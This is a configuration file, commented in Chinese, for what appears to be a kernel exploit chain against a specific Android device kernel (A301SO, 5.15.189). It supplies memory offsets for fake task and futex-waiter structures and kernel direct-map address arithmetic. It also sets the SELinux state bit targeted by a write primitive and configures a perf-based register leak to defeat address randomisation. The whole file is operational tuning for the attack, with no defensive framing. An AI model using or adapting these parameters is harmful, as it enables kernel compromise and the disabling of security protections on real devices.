# =============================================================================
# R3b：注入 generator（Kotlin 数据平面）参数
#
# 状态：**debug-only**。三路 generator 用这些目标事实在 placement 拿到
# candidatePageBase 之后生成 landing bytes / frame bytes / 三地址；
# 缺键一律 fail-closed（不填默认值）。
#
# 依据（只读参考）：
#   generator.address_model ← legacy2/core/address_math.cpp:data_alias
#   generator.payload       ← legacy2/core/target.h + memory.cpp:payload_write_layout
#                             + support.cpp:prepare_skb_payload
#   generator.multicast     ← legacy2/core/route_multicast.cpp:76-131 +
#                             very_legacy/fops.c:k5_build_mcast_stamp/D3 disarm
#   generator.pselect       ← legacy2/core/route_select.cpp:283-352（compact waiter 词表）
#   generator.tcp           ← legacy2/core/route_tcp.cpp + route_tcp_session.cpp.disabled:55-64
# =============================================================================

# 单 route 注入选择：multicast | pselect | tcp_zerocopy（每次只走一条，不 fallback）。
injection {
  primitive = "multicast"
  # victim 传输：process=既有 Kotlin shell 循环（默认）；jni-spawn=通用 helper
  # （posix_spawn；需 perf.enabled=1，缺配置 fail-closed，不静默回退）。
  victim = "process"       # 可选 common（opt-in，公共 core VictimSession+VictimNativeJni）；默认 process
}

generator {
  # ① image → direct-map 别名：((kernel_phys_load + symbol_off) - kernel_phys_offset)
  #    | direct_map_base；symbol_off 取上方 `offset.*`（相对 Image 文本基址）。
  address_model {
    # 0xffffff8000000000：HOCON/typesafe-config 只接受有符号 Long，写成十进制负数。
    direct_map_base = -549755813888
    kernel_phys_load = 2818572288
    kernel_phys_offset = 2147483648
  }

  # ② 64 KiB 发送缓冲的槽位布局（compact waiter；A301SO 5.15.189）。
  payload {
    lock_off = 3712
    w0_off = 4480
    right_off = 4672
    left_off = 4704
    fake_task_off = 4736
    skb_data_delta = -3712
    skb_frag_bias = 0
    tcp_payload_delta = 0
    tcp_chunk_bias = 3712
    tcp_fake_task_off = 22528
    compact_waiter = 1
    fake_task_usage_off = 64
    fake_task_prio = 120
    fake_waiter_prio = 140
    # preserve_child（W1 zero 写）的写值相对候选页基址的偏移（旧 page_base + 0x100）。
    write_value_offset = 256
    # selinux_state.initialized 在写值里的位下标（旧 ((right >> 16) & 1) 判据）。
    page_accept_bit = 16
  }

  # ③ multicast：stamp 几何 + D3 ghost disarm（attempts/arm/hold 见执行参数）。
  multicast {
    frame_size = 264
    family_offset = 8
    stamp_family = 0
    disarm_required = 1
    futex_waiter_flag = 2147483648
  }

  # ④ pselect：fd_set 词表窗口（nfds=320 ⇒ 每 set 5 个 64 位字）。
  pselect {
    nfds = 320
    max_nfds = 320
    operation_budget = 4
    timeout_nanos = 800000000
    per_attempt_delay_ns = 0
    enter_delay_ns = 50000000
    fd_reserve_stride = 64
    select_use_timeval = 0
    waiter_shift = -2
  }

  # ⑤ tcp zerocopy：zc 请求体 + 16 MiB 打洞映射 + 相位/arm 参数。
  tcp {
    mapping_size = 16777216
    max_mapping = 16777216
    frame_size = 64
    max_frame = 64
    receive_size = 64
    operation_budget = 2000
    timeout_nanos = 1000000000
    punch_spin = 10000000
    punch_phase_spin = 10000000
    post_hold_iterations = 20000
    arm_sequence = 16
    zc_address_offset = 24
    zc_length_offset = 32
    zc_task_offset = 40
    zc_lock_offset = 48
    send_fill_byte = 51
    mapping_fill_byte = 85
  }
}

# =============================================================================
# P1b-1：G01 fail-stop + G08 CPU pin（debug-only）
# =============================================================================
failStop {
  # 1=DIRTY/retained 结果先落 evidence/日志（flush）再强制终止（legacy exit_group(70) 同形）；
  # 0=只记录不终止（仅调试）。缺省=1；release 不读 debug 配置。
  enabled = 1
}

execution {
  # G08：owner/waiter 不 pin（-1 = Native u32 0xFFFFFFFF 哨兵）；consumer 保持 pin。
  # 首次真机门禁=只 pin consumer（legacy 同形），后续单变量 A/B 再开 owner/waiter pin。
  owner_cpu = -1
  waiter_cpu = -1
  consumer_cpu = 2
}

# =============================================================================
# R3e：perf 采样原语参数（debug-only；默认关闭）
#
# 状态：**debug-only**，`enabled = 0`（默认关闭）。生产启用硬门=G1 真机门禁
#       （A301SO 冷机：App 跨任务权限/寄存器投递/reg31/0x200/3 pass 2-of-3）；
#       G1 未过不得改 enabled=1、不得标 supported。
# 解析：`A301SoDebugConfig.parsePerf`；缺 `perf` 段⇒perf 路径禁用；
#       段存在但缺键⇒fail-closed（不填默认值）。
# 依据：docs/plan/43499-perf-leak-primitive-plan.md §3/§7 + 附件 A §B。
# =============================================================================
# =============================================================================
# G05：fast-repair prebuild（debug-only；默认 false ⇒ 与既有行为完全一致）
# =============================================================================
writeChain {
  # 1=W1 出口预建 repair placement+landing（E6 显式打开；Native 零改动）。
  fast_repair_prebuild_enabled = 0
  # 1=prebuild clean failure 后允许 W2 完整 fallback（panic 窗口不改善）。
  allow_full_fallback = 0
}

# =============================================================================
# B6：finish 派发前有界 settle（debug-only；默认 2000ms）
# =============================================================================
finish {
  # 派发前 settle（毫秒；0..10000；超界 fail-closed）。
  pre_dispatch_settle_ms = 2000
}

perf {
  # 1=允许构造 perf target source；0=禁用（默认）。
  enabled = 0

  # perf_event_attr 显式字段（其余字段由 Native {0} 初始化为机制零值）。
  attr {
    type = 1                    # PERF_TYPE_SOFTWARE
    config = 0                  # PERF_COUNT_SW_CPU_CLOCK
    sample_period = 5000
    sample_type = 262145        # PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR（1|1<<18）
    sample_regs_intr = 4294967295  # (1<<32)-1，32 个寄存器
    flags = 8                   # PERF_FLAG_FD_CLOEXEC
    disabled = 1
  }
  exclude {
    user = 1
    hv = 1
    idle = 1
  }
  auto_enable = 1
  ring_pages = 64
  pump_iterations = 128
  pump_budget_nanos = 1500000000
  max_passes = 3
  min_votes_floor = 64
  min_votes_ratio = 0.25
  task_alignment = 512          # 0x200（G1 后按证据收紧 require_alignment）
  register_count = 32
  sp_register_index = 31
  candidate_capacity = 256
  require_alignment = 0         # H1-a：G1 前仅记录 evidence
  require_sp_evidence = 0       # H1-a：G1 前仅记录 evidence
  settle_after_acquire_us = 50000
}
